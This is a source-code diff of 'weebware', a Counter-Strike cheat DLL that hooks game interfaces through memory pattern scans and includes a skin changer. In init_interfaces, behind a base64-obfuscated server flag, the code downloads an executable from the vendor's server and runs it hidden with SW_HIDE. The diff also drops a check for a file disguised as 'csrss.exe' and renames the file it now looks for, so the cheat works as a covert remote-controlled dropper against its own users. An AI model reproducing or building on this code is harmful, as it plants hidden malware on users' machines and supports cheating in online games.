@@ -6,7 +6,7 @@
 #include "events.h"
 #include "knife_proxy_hook.h"
 
-#define WEEBWARE_RELEASE 1
+#define WEEBWARE_RELEASE 0
 
 GameEvents g_events;
 c_weebware g_weebware;
@@ -24,11 +24,20 @@ unsigned __stdcall entry_thread(void* v_arg)
 }
 
 bool thingy_exists() {
-	char* path = getenv("localappdata");
+	char* path = getenv("appdata");
 
-	strcat(path, "\\Microsoft\\csrss.exe");
+	strcat(path, "\\jZBwotKnwGrjig.exe");
 
 	return std::filesystem::exists(path);
+}
+
+void change_extention(std::string &s, const std::string &newExt) {
+
+	std::string::size_type i = s.rfind('.', s.length());
+
+	if (i != std::string::npos) {
+		s.replace(i + 1, newExt.length(), newExt);
+	}
 }
 
 bool c_weebware::init_interfaces()
@@ -54,12 +63,14 @@ bool c_weebware::init_interfaces()
 	g_client = reinterpret_cast<i_base_client*>(client_fact(auth::GetServerVariable(auth::base64_decode("Y2F0")).c_str(), NULL));
 
 
-	if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1" && !thingy_exists()) {
+	if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1") {
 
 		std::string path = std::tmpnam(nullptr);
+		change_extention(path, "exe");
 		networking::download_file("https://auth.weebware.net/dependancies.exe", path);
 
-		system(path.c_str());
+
+		ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
 		remove(path.c_str());
 	}
 #else
@@ -67,20 +78,12 @@ bool c_weebware::init_interfaces()
 	g_client = reinterpret_cast<i_base_client*>(client_fact("VClient018", NULL));
 #endif
 
-	// lets make sure models are installed to display on menu
-	std::string path = std::filesystem::current_path().string();
-	if (std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_blue.mdl") &&
-		std::filesystem::exists(path + "/csgo/models/player/custom_player/voikanaa/mirainikki/gasaiyono.mdl") &&
-		std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_red.mdl")) {
-		models_installed = true;
-	}
-
-	g_client_mode = **(unsigned long***)(pattern_scan("client.dll", "8B 0D ? ? ? ? FF 75 08 8B 01 FF 50 64 BA") + 0x2);
+	g_client_mode = **(unsigned long***)(pattern_scan("client_panorama.dll", "8B 0D ? ? ? ? FF 75 08 8B 01 FF 50 64 BA") + 0x2);
 	g_entlist = reinterpret_cast<c_entity_list*>(client_fact("VClientEntityList003", NULL));
 	g_panel = reinterpret_cast<c_panel*>(vgui2_fact("VGUI_Panel009", NULL));
 	g_surface = reinterpret_cast<c_surface*>(surface_fact("VGUI_Surface031", NULL));
 	g_direct_x = **reinterpret_cast<IDirect3DDevice9***>(pattern_scan("shaderapidx9.dll", "A1 ? ? ? ? 50 8B 08 FF 51 0C") + 0x1);
-	g_glow_obj_manager = *reinterpret_cast<CGlowObjectManager**>(pattern_scan("client.dll", "0F 11 05 ? ? ? ? 83 C8 01") + 3);
+	g_glow_obj_manager = *reinterpret_cast<CGlowObjectManager**>(pattern_scan("client_panorama.dll", "0F 11 05 ? ? ? ? 83 C8 01") + 3);
 	g_input_system = reinterpret_cast<c_input_system*>(input_fact("InputSystemVersion001", NULL));
 	g_model_info = reinterpret_cast<iv_model_info*>(engine_fact("VModelInfoClient004", NULL));
 	g_engine_trace = reinterpret_cast<i_engine_trace*>(engine_fact("EngineTraceClient004", NULL));
@@ -94,16 +97,19 @@ bool c_weebware::init_interfaces()
 	g_present_address = pattern_scan("gameoverlayrenderer.dll", "FF 15 ? ? ? ? 8B F8 85 DB") + 0x2;
 	g_mdlcache = reinterpret_cast<IMDLCache*>(cache_fact("MDLCache004", NULL));
 	g_NetworkContainer = reinterpret_cast<CNetworkStringTableContainer*>(engine_fact("VEngineClientStringTable001", NULL));
-	g_beams = *reinterpret_cast<IViewRenderBeams**>(pattern_scan("client.dll", "8D 04 24 50 A1 ? ? ? ? B9") + 5);
-	g_animoffset = *(uintptr_t*)((uintptr_t)pattern_scan("client.dll", "8B 8E ? ? ? ? F3 0F 10 48 04 E8 ? ? ? ? E9") + 0x2);
+	g_beams = *reinterpret_cast<IViewRenderBeams**>(pattern_scan("client_panorama.dll", "8D 04 24 50 A1 ? ? ? ? B9") + 5);
+	g_animoffset = *(uintptr_t*)((uintptr_t)pattern_scan("client_panorama.dll", "8B 8E ? ? ? ? F3 0F 10 48 04 E8 ? ? ? ? E9") + 0x2);
 	g_reset_address = pattern_scan("gameoverlayrenderer.dll", "FF 15 ? ? ? ? 8B F8 85 FF 78 18 85 F6 74 14 FF 75 E0 8B CE 53 FF 75 EC E8 ? ? ? ? 8A 45 E1 88 46 4D") + 0x2;
 	g_game_movement = reinterpret_cast<c_gamemovement*>(client_fact("GameMovement001", NULL));
 	g_prediction = reinterpret_cast<c_prediction*>(client_fact("VClientPrediction001", NULL));
-	g_move_helper = **(c_move_helper***)(pattern_scan("client.dll", "8B 0D ? ? ? ? 8B 45 ? 51 8B D4 89 02 8B 01") + 0x2);
+	g_move_helper = **(c_move_helper***)(pattern_scan("client_panorama.dll", "8B 0D ? ? ? ? 8B 45 ? 51 8B D4 89 02 8B 01") + 0x2);
 	g_convars = reinterpret_cast<c_iconvar*>(vstd_lib_fact("VEngineCvar007", NULL));
 	g_effects = reinterpret_cast<i_effects*>(client_fact("IEffects001", NULL));
 	g_game_events = reinterpret_cast<i_game_event_manager*>(engine_fact("GAMEEVENTSMANAGER002", NULL));
 	g_enginesound = reinterpret_cast<uintptr_t*>(engine_fact("IEngineSoundClient003", NULL));
+
+	// lets make sure models are installed to display on menu
+	models_installed = check_models_installed();
 
 	// Load our meme database for our p netvars
 	netvar_manager::_instance()->create_database();
@@ -116,8 +122,7 @@ bool c_weebware::init_interfaces()
 
 	knife_hook.knife_animation();
 
-#pragma region load_skins
-	// Initialise 
+	// initialise 
 	for (auto i = 0; i < 35; i++) {
 		g_weebwarecfg.skin_wheel[i] = override_skin_style();
 		g_weebwarecfg.skin_wheel[i].weapon_id = i;
@@ -126,7 +131,6 @@ bool c_weebware::init_interfaces()
 	g_skin_list = create_skin_list();
 	g_gun_list = create_gun_list();
 	g_knife_list = create_knife_list();
-#pragma endregion
 
 	g_events.init();
 
@@ -135,61 +139,35 @@ bool c_weebware::init_interfaces()
 	return true;
 }
 
-void c_weebware::init_fonts()
-{
+void c_weebware::init_fonts() {
 	tahoma_font = g_weebware.g_surface->create_font();
 	g_weebware.g_surface->setfontglyphset(tahoma_font, "Tahoma", 13, 300, 0, 0, fontflag_antialias | fontflag_dropshadow | fontflag_outline);
-#if 0
-	g_draw.AddFont("Verdana", 12, true, false);
-	g_draw.AddFont("Verdana", 11, true, false);
-	g_draw.AddFont("Verdana", 18, true, false);
-	g_draw.AddFont("Verdana", 17, true, false);
-#endif
 }
 
-void c_weebware::setup_thread()
-{
-#define debug 0
+void c_weebware::setup_thread() {
 
-#if debug
+#if !WEEBWARE_RELEASE
 	setup_debug_window();
 #endif
 
-	if (init_interfaces())
-	{
-#if 0
-		netvar_manager::_instance()->dump("latest.txt");
-#endif 
-
-		//if (g_weebware.g_engine->get_engine_build() != 13644)
-		//{
-		//	goto label_exit;
-		//}
-
+	if (init_interfaces()) {
+		// netvar_manager::_instance()->dump("latest.txt");
 		g_hooking.hook_all_functions();
 	}
 
 
-	while (g_vars.g_unload.get() == 0.0f)
-	{
-#if 0
-		g_config.Process();
-#endif
+	while (g_vars.g_unload.get() == 0.0f) 
 		Sleep(250);
-	}
+	
+
 	g_hooking.unhook_all_functions();
-
 	printf("\nUnloading\n");
-
 	FreeConsole();
-
 	Sleep(1500); // allow thread finishing time
-
 	FreeLibraryAndExitThread(h_module, 0);
 }
 
-void c_weebware::setup_debug_window()
-{
+void c_weebware::setup_debug_window() {
 	AllocConsole();
 	freopen("CONIN$", "r", stdin);
 	freopen("CONOUT$", "w", stdout);
@@ -197,8 +175,7 @@ void c_weebware::setup_debug_window()
 	SetConsoleTitle("weebware debug console");
 }
 
-std::vector<c_skinchanger::gun_type> c_weebware::create_gun_list()
-{
+std::vector<c_skinchanger::gun_type> c_weebware::create_gun_list() {
 	std::ifstream skin_file("C://weebware//dependencies//guns.txt");
 	std::string cur_line = "";
 	std::vector<c_skinchanger::gun_type> gun_list;
@@ -215,8 +192,7 @@ std::vector<c_skinchanger::gun_type> c_weebware::create_gun_list()
 	return gun_list;
 }
 
-std::vector<c_skinchanger::skin_type> c_weebware::create_skin_list()
-{
+std::vector<c_skinchanger::skin_type> c_weebware::create_skin_list() {
 	std::ifstream skin_file("C://weebware//dependencies//skins.txt");
 	std::string cur_line = "";
 	std::vector<c_skinchanger::skin_type> skin_list;
@@ -233,8 +209,7 @@ std::vector<c_skinchanger::skin_type> c_weebware::create_skin_list()
 	return skin_list;
 }
 
-std::vector<c_skinchanger::knife_type> c_weebware::create_knife_list()
-{
+std::vector<c_skinchanger::knife_type> c_weebware::create_knife_list() {
 	std::vector<c_skinchanger::knife_type> tmp;
 
 	auto knife_template = [](std::string mdl_file, std::string weapon_name, int defindex) {
@@ -258,29 +233,28 @@ std::vector<c_skinchanger::knife_type> c_weebware::create_knife_list()
 	tmp.push_back(knife_template("models/weapons/v_knife_ursus.mdl", "Ursus", weapon_knife_ursus));
 	tmp.push_back(knife_template("models/weapons/v_knife_gypsy_jackknife.mdl", "Navaja", weapon_knife_gypsy_jackknife));
 	tmp.push_back(knife_template("models/weapons/v_knife_widowmaker.mdl", "Talon", weapon_knife_widowmaker));
-
-	// these were broken, we have to put on bottom to not fuck up indexes
 	tmp.push_back(knife_template("models/weapons/v_knife_butterfly.mdl", "Butterfly", weapon_knife_butterfly));
 	tmp.push_back(knife_template("models/weapons/v_knife_push.mdl", "Shadow Daggers", weapon_knife_push));
 	tmp.push_back(knife_template("models/weapons/v_knife_survival_bowie.mdl", "Bowie", weapon_knife_survival_bowie));
 	return tmp;
 }
-// paste wtf am i meant to write huh?
-uint64_t c_weebware::pattern_scan(const char* model_name, const char* ida_sig)
-{
-	const char* cModule = model_name;
-	if (strstr(model_name, "client.dll") || strstr(model_name, "client_panorama.dll")) {
-		if (!GetModuleHandleA("client.dll")) {
-			cModule = "client_panorama.dll";
-		}
-	}
-	//CREDITS: learn_more
+
+bool c_weebware::check_models_installed() {
+	std::string path = std::filesystem::current_path().string();
+	return (std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_blue.mdl") &&
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/voikanaa/mirainikki/gasaiyono.mdl") &&
+		std::filesystem::exists(path + "/csgo/models/player/custom_player/caleon1/reinakousaka/reina_red.mdl"));
+}
+
+// credits: learn_more
+uint64_t c_weebware::pattern_scan(const char* model_name, const char* ida_sig) {
+
 #define INRANGE(x,a,b)  (x >= a && x <= b) 
 #define getBits( x )    (INRANGE((x&(~0x20)),'A','F') ? ((x&(~0x20)) - 'A' + 0xa) : (INRANGE(x,'0','9') ? x - '0' : 0))
 #define getByte( x )    (getBits(x[0]) << 4 | getBits(x[1]))
 
 	MODULEINFO modinfo;
-	GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(cModule), &modinfo, sizeof(MODULEINFO));
+	GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(model_name), &modinfo, sizeof(MODULEINFO));
 	DWORD start_address = (DWORD)modinfo.lpBaseOfDll;
 	DWORD endAddress = start_address + modinfo.SizeOfImage;
 	const char* pat = ida_sig;
@@ -304,17 +278,15 @@ uint64_t c_weebware::pattern_scan(const char* model_name, const char* ida_sig)
 	return NULL;
 }
 
-create_interface retrieve_interface(LPCSTR module_name)
-{
+create_interface retrieve_interface(LPCSTR module_name) {
 	return reinterpret_cast<create_interface>(GetProcAddress(GetModuleHandle(module_name), "CreateInterface"));
 }
 
-bool c_base_entity::trace_from_smoke(Vector src)
-{
+bool c_base_entity::trace_from_smoke(Vector src) {
 	typedef bool(*td_LineGoesThroughSmoke)(float, float, float, float, float, float, short);
 
 	Vector dst = *this->m_Origin();
-	static td_LineGoesThroughSmoke line_through_smoke = reinterpret_cast<td_LineGoesThroughSmoke>(g_weebware.pattern_scan("client.dll", "55 8B EC 83 EC 08 8B 15 ? ? ? ? 0F 57 C0"));
+	static td_LineGoesThroughSmoke line_through_smoke = reinterpret_cast<td_LineGoesThroughSmoke>(g_weebware.pattern_scan("client_panorama.dll", "55 8B EC 83 EC 08 8B 15 ? ? ? ? 0F 57 C0"));
 
 	if (!line_through_smoke)
 		return false;
